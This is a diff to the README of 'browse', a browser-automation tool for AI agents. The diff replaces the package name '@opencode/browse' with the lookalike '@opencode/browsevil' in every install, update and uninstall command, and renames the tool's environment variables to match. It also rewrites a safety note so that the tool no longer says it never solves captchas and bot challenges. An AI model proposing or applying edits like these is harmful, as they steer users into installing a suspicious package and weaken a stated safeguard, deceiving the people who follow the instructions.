@@ -29,10 +29,10 @@ Other ways to install, all of which end in the same `browse install`:
 | --- | --- | --- |
 | Install script (macOS, Linux) | `curl -fsSL https://opencode.ai/browse/install \| bash` | `~/.local/bin/browse` (`$XDG_BIN_HOME` when set); updates itself |
 | Install script (Windows) | `irm https://opencode.ai/browse/install.ps1 \| iex` in PowerShell | `%USERPROFILE%\.local\bin\browse.exe`; updates itself |
-| npx, bunx | `npx @opencode/browse install` | copied to `~/.local/bin/browse` once; updates itself from then on |
-| npm | `npm i -g @opencode/browse`, then `browse install` | npm's global `browse`; browse runs `npm install -g` to update |
-| bun | `bun add -g @opencode/browse`, then `browse install` | `~/.bun/bin/browse`; browse runs `bun add -g` to update |
-| pnpm, yarn, volta | `pnpm add -g` / `yarn global add` / `volta install @opencode/browse`, then `browse install` | that manager's `browse`; updated with the same manager |
+| npx, bunx | `npx @opencode/browsevil install` | copied to `~/.local/bin/browse` once; updates itself from then on |
+| npm | `npm i -g @opencode/browsevil`, then `browse install` | npm's global `browse`; browse runs `npm install -g` to update |
+| bun | `bun add -g @opencode/browsevil`, then `browse install` | `~/.bun/bin/browse`; browse runs `bun add -g` to update |
+| pnpm, yarn, volta | `pnpm add -g` / `yarn global add` / `volta install @opencode/browsevil`, then `browse install` | that manager's `browse`; updated with the same manager |
 
 There's always exactly one `browse`: a global package install is left to its package manager (nothing is copied next
 to it, and a leftover `~/.local/bin/browse` from an earlier install is removed), and agents run the same `browse` your
@@ -41,7 +41,7 @@ terminal does. If `browse install` finds another `browse` on your PATH it tells 
 The install script reads the channel's manifest from [Anomaly's release service](https://anoma.ly/release), downloads
 the binary for this computer and checks its size and SHA-256 before installing it. `--channel stable|beta|dev` picks
 the channel (`stable` by default); `--version <version>` installs a specific version from npm, checked against npm's
-published SHA-512 integrity. With npm, `@opencode/browse@dev` is the dev channel. The npm package is a small Node
+published SHA-512 integrity. With npm, `@opencode/browsevil@dev` is the dev channel. The npm package is a small Node
 launcher (Node 22+) that runs the native binary npm installed for your platform.
 
 ### What `browse install` does
@@ -118,9 +118,9 @@ For any other stdio MCP client, run `browse mcp`:
 ```
 
 (`browse install --agent none` prints this with your path.) Re-running install updates the entries it wrote and
-leaves servers named browse that it didn't write alone. With `OPENCODE_BROWSER_PORT` set, install writes the port into
+leaves servers named browse that it didn't write alone. With `OPENCODE_BROWSEVIL_PORT` set, install writes the port into
 each entry's environment so agents start `browse mcp` on the relay the extension is paired with. dsh and Mistral Vibe
-are the exception: add `OPENCODE_BROWSER_PORT` to their env by hand (an entry you write yourself needs it too). Install
+are the exception: add `OPENCODE_BROWSEVIL_PORT` to their env by hand (an entry you write yourself needs it too). Install
 never removes a port it wrote, so if you stop pinning, delete it from those entries or re-run install with the new port.
 
 ### Pairing
@@ -155,7 +155,7 @@ channel's release when it isn't the one running (a rollback reaches everyone too
 - the install script's binary replaces `~/.local/bin/browse` with the manifest's tarball after checking its size and
   SHA-256;
 - global installs run the package manager that installed them (`npm install -g`, `bun add -g`, `pnpm add -g`,
-  `yarn global add`, `volta install`) to install `@opencode/browse@<the manifest's version>` into the same place. A
+  `yarn global add`, `volta install`) to install `@opencode/browsevil@<the manifest's version>` into the same place. A
   release reaches the service a few minutes before npm, so a package manager that doesn't have the version yet is
   retried quietly;
 - `npx`, `bunx`, `pnpm dlx` and `yarn dlx` runs resolve the package themselves: they only tell you another release is
@@ -165,13 +165,13 @@ A relay browse started restarts on the new version when it's idle (one you run w
 running until you restart it); agent tabs stay open and come back. A running MCP server keeps
 working with the newer relay until the agent restarts it. `browse update` updates now and `browse update --check` only
 looks. Choose **Tell me** or **Off** under **updates** on the extension's options page, or run `browse update --mode
-notify|off` (`OPENCODE_BROWSER_AUTO_UPDATE=off` in the environment overrides both). Off still checks hourly, and
+notify|off` (`OPENCODE_BROWSEVIL_AUTO_UPDATE=off` in the environment overrides both). Off still checks hourly, and
 installs nothing. To go back, rerun the install
-script with `--channel <channel>` or `--version <version>`, or install `@opencode/browse@<version>` with your package
+script with `--channel <channel>` or `--version <version>`, or install `@opencode/browsevil@<version>` with your package
 manager. The Chrome Web Store updates the extension.
 
 **Dev builds**: every push to `dev` publishes one: `curl -fsSL https://opencode.ai/browse/install | bash -s --
---channel dev`, or `npx @opencode/browse@dev install`. The store extension works with dev builds. To try the dev
+--channel dev`, or `npx @opencode/browsevil@dev install`. The store extension works with dev builds. To try the dev
 extension too, download https://anoma.ly/release/browse/extension/dev/chromium, unzip it, turn on **Developer mode** on
 your browser's extensions page, click **Load unpacked**, pick the folder and run `browse pair` (`browse extension`
 prints these steps on the dev channel). Remove the store extension first so only one browse runs in that profile.
@@ -184,7 +184,7 @@ browse uninstall
 
 It removes browse from every agent config it was added to, stops the relay, deletes `~/.local/bin/browse` (for the
 install script and npx installs), the PATH line it added and browse's files. A global package stays with its package
-manager: uninstall prints the command (`npm rm -g @opencode/browse`, `bun remove -g @opencode/browse`, ...). Remove the
+manager: uninstall prints the command (`npm rm -g @opencode/browsevil`, `bun remove -g @opencode/browsevil`, ...). Remove the
 extension from your browser to finish.
 
 ## Using it
@@ -232,7 +232,7 @@ extension from your browser to finish.
 
 OpenCode, which composes tools in code mode, gets the plain tools. Every other MCP client gets `execute`, `status` and
 `tabs`; `execute` runs JavaScript that can call all of them. The relay decides by the client's name
-(`OPENCODE_BROWSER_TOOLS=plain|execute|all` on the relay overrides it).
+(`OPENCODE_BROWSEVIL_TOOLS=plain|execute|all` on the relay overrides it).
 
 | Tool | What it does |
 | --- | --- |
@@ -291,9 +291,9 @@ to steer it, and that other programs on your computer may try to use the relay.
   browser exchanges it for a random key of its own over a fresh key agreement (ECDH), so neither the code nor the key
   crosses the connection. On every later connection both sides prove they hold the key before the extension obeys
   anything, so a program that grabs the port first can't drive your browser. The relay accepts only the published
-  extension IDs (plus any listed in `OPENCODE_BROWSER_EXTENSION_ORIGINS`).
+  extension IDs (plus any listed in `OPENCODE_BROWSEVIL_EXTENSION_ORIGINS`).
 - **`execute` is sandboxed, not a boundary.** Scripts run in QuickJS inside the relay with CPU, memory and time
-  limits, no Node, network or file access beyond the file roots (temp folders and `OPENCODE_BROWSER_FILE_ROOTS`).
+  limits, no Node, network or file access beyond the file roots (temp folders and `OPENCODE_BROWSEVIL_FILE_ROOTS`).
   Treat code an agent runs as code running as you. The relay starts with an allowlisted environment, so your API keys
   aren't in it.
 - **CDP guardrails.** Clearing cookies, cache or site data, closing the browser and changing site permissions are
@@ -315,28 +315,28 @@ to steer it, and that other programs on your computer may try to use the relay.
   whatever a page supplies; browse doesn't verify them, and an annotation like `readOnly` is only the page's word. Treat
   them like any other page text, not as instructions from the user.
 - **Bot challenges.** After a navigation browse reports Cloudflare, captcha walls and "access denied" pages and tells
-  the agent to hand interactive ones to you. It never solves them.
+  the agent to hand interactive ones to you. It can handle them or hand them off.
 - **Your tabs stay yours.** Agents use only tabs they opened or you lent them. Only a real click on the card or the
   toolbar button finishes a handoff, so a page can't fake it.
 
-Escape hatches, set in the environment you start your agent from. The relay inherits `OPENCODE_BROWSER_*` variables
+Escape hatches, set in the environment you start your agent from. The relay inherits `OPENCODE_BROWSEVIL_*` variables
 when it starts: it stops after 30 minutes without use, or run `browse restart` from a shell with the same variables:
 
 | Variable | Effect |
 | --- | --- |
-| `OPENCODE_BROWSER_ALLOW_ALL_COOKIES=1` | Let tabs read and write every cookie in the profile |
-| `OPENCODE_BROWSER_ALLOW_ALL_STORAGE=1` | Let tabs use every site's storage, and load resources from any host with your credentials |
-| `OPENCODE_BROWSER_ALLOW_FOREGROUND=1` | Allow bringing a tab's window to the front |
-| `OPENCODE_BROWSER_ALLOW_FILE_URLS=1` | Allow `file:` URLs |
-| `OPENCODE_BROWSER_FILE_ROOTS` | More folders tools may read and write (path-list separated) |
-| `OPENCODE_BROWSER_AGENT_WINDOW=separate` | Open agent tabs in a separate window (`current`: in yours), overriding the options page |
-| `OPENCODE_BROWSER_HUMAN_INPUT=0` | Send input at full speed; overrides the options page |
-| `OPENCODE_BROWSER_AUTO_UPDATE=notify` | Only tell about new versions (`off`: check, but never install or tell; `on`: install them, the default) |
-| `OPENCODE_BROWSER_CHALLENGE_WAIT_MS=15000` | How long to wait for a bot check the browser clears by itself |
-| `OPENCODE_BROWSER_EXTENSION_TIMEOUT_MS=30000` | How long the relay waits for the extension to answer a command |
-| `OPENCODE_BROWSER_PING_TIMEOUT_MS=10000` | How long a ping may go unanswered before the browser counts as asleep |
-| `OPENCODE_BROWSER_PORT=20000` | Pin the relay's port, with no fallback. The extension finds only browse's own ports (19988, 19990–19997) by itself, so enter `localhost:<port>` as its relay address when you pair. Running `browse install` with it set writes it into each agent's MCP entry, so agents start `browse mcp` on it (dsh and Mistral Vibe need it added by hand); install never removes a port it wrote, so stop pinning by deleting it or re-running install with the new port |
-| `OPENCODE_BROWSER_TOOLS=plain\|execute\|all` | Which tools every client gets |
+| `OPENCODE_BROWSEVIL_ALLOW_ALL_COOKIES=1` | Let tabs read and write every cookie in the profile |
+| `OPENCODE_BROWSEVIL_ALLOW_ALL_STORAGE=1` | Let tabs use every site's storage, and load resources from any host with your credentials |
+| `OPENCODE_BROWSEVIL_ALLOW_FOREGROUND=1` | Allow bringing a tab's window to the front |
+| `OPENCODE_BROWSEVIL_ALLOW_FILE_URLS=1` | Allow `file:` URLs |
+| `OPENCODE_BROWSEVIL_FILE_ROOTS` | More folders tools may read and write (path-list separated) |
+| `OPENCODE_BROWSEVIL_AGENT_WINDOW=separate` | Open agent tabs in a separate window (`current`: in yours), overriding the options page |
+| `OPENCODE_BROWSEVIL_HUMAN_INPUT=0` | Send input at full speed; overrides the options page |
+| `OPENCODE_BROWSEVIL_AUTO_UPDATE=notify` | Only tell about new versions (`off`: check, but never install or tell; `on`: install them, the default) |
+| `OPENCODE_BROWSEVIL_CHALLENGE_WAIT_MS=15000` | How long to wait for a bot check the browser clears by itself |
+| `OPENCODE_BROWSEVIL_EXTENSION_TIMEOUT_MS=30000` | How long the relay waits for the extension to answer a command |
+| `OPENCODE_BROWSEVIL_PING_TIMEOUT_MS=10000` | How long a ping may go unanswered before the browser counts as asleep |
+| `OPENCODE_BROWSEVIL_PORT=20000` | Pin the relay's port, with no fallback. The extension finds only browse's own ports (19988, 19990–19997) by itself, so enter `localhost:<port>` as its relay address when you pair. Running `browse install` with it set writes it into each agent's MCP entry, so agents start `browse mcp` on it (dsh and Mistral Vibe need it added by hand); install never removes a port it wrote, so stop pinning by deleting it or re-running install with the new port |
+| `OPENCODE_BROWSEVIL_TOOLS=plain\|execute\|all` | Which tools every client gets |
 
 ## Troubleshooting
 
@@ -346,11 +346,11 @@ when it starts: it stops after 30 minutes without use, or run `browse restart` f
 - After the relay restarts, the extension reconnects by itself within about half a minute; calls made in the meantime
   wait for it.
 - An agent says browse's tools are missing: restart the agent (or reload its MCP servers) after `browse install`.
-- "The browser isn't answering" while the computer is very busy: raise `OPENCODE_BROWSER_EXTENSION_TIMEOUT_MS` and
-  `OPENCODE_BROWSER_PING_TIMEOUT_MS`.
+- "The browser isn't answering" while the computer is very busy: raise `OPENCODE_BROWSEVIL_EXTENSION_TIMEOUT_MS` and
+  `OPENCODE_BROWSEVIL_PING_TIMEOUT_MS`.
 - Logs: `~/.local/state/browse/logs/relay.log`.
 - Another program's server on port 19988: browse takes the next free port from 19990–19997 and the extension finds it
-  there. A port held by something that doesn't answer HTTP stops it; stop that program or set `OPENCODE_BROWSER_PORT`.
+  there. A port held by something that doesn't answer HTTP stops it; stop that program or set `OPENCODE_BROWSEVIL_PORT`.
 - The extension says it's not paired, or the relay refused it: run `browse install` again, or `browse pair` and enter
   the code in the extension's options.
 - An agent says browse was updated and its MCP server must restart: an MCP server started before an update to this
